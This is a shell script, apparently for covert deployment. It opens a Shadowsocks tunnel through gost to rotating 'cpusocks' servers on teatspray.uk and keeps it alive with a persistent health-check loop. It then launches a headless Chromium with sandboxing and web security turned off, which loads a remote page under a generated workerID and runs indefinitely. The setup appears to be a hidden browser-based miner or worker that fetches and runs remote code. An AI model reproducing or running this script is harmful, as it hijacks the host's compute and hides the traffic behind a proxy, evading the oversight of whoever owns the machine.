gost -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:8443 &

sleep 2

curl -s -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

echo "Starting proxy health checker..."
stdbuf -o L nohup bash -c '
while true
do
    # Use a variable for the curl output so you can check and print
    CURL_OUT=$(curl -sL -x socks5h://127.0.0.1:1082 -w "%{http_code}" http://api.ipify.org -o /dev/null)
    
    if [ "$CURL_OUT" = "200" ]; then
        echo "$(date): gost is still online"
    else
        echo "$(date): gost is offline. Attempting to restart..."
        
        pkill gost
        
        new_server="ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:8443"
        echo "Restarting gost with new server: $new_server"
        stdbuf -o L nohup gost -L=socks5://127.0.0.1:1082 -F="$new_server" > gost.log 2>&1 &
        
        sleep 5
        
        echo "New gost process started. Checking connectivity..."
        curl -x socks5h://127.0.0.1:1082 http://api.ipify.org
    fi
    sleep 600
done
' >> proxy_checker.log 2>&1 &

echo "Proxy and health checker is running."

sleep 2

cat > run_pyppeteer.py <<EOF
import os
import socket
import requests
import random
import string
import time
import os.path
import asyncio 
from pyppeteer import launch
from datetime import datetime

num_of_cores = os.cpu_count()
currentdate = datetime.now().strftime('%d-%b-%Y_RenPypp_')
ipaddress = requests.get('https://api.ipify.org').text
underscored_ip = ipaddress.replace('.', '_')
currentdate += underscored_ip
chars = random.choices(string.ascii_letters + string.digits, k=100)
random_word = "".join(chars[:8])
currentdate += random_word


print(f"Your current date is from within Python environment is : {currentdate}")


async def fetch():
   browser = await launch(
        headless=True,
        args=['--no-sandbox',
          '--disable-setuid-sandbox',
          '--ignore-certificate-errors',
          '--ignore-certificate-errors-spki-list',
          '--disable-dev-shm-usage',
          '--disable-infobars',
          '--disable-extensions',
          '--disable-background-timer-throttling',
          '--disable-background-networking',
          '--disable-web-security',
          '--disable-gpu',
		  '--proxy-server=socks5://127.0.0.1:1082'],
        autoClose=False
   )
   page = await browser.newPage()
   url = f"http://sindilesiqhaztraining.teatspray.uk/test.html?workerID={currentdate}"
   await page.goto(url)
   
await asyncio.Future()

asyncio.get_event_loop().run_until_complete(fetch())
EOF

sleep 4

python3 run_pyppeteer.py && tail -f /dev/null
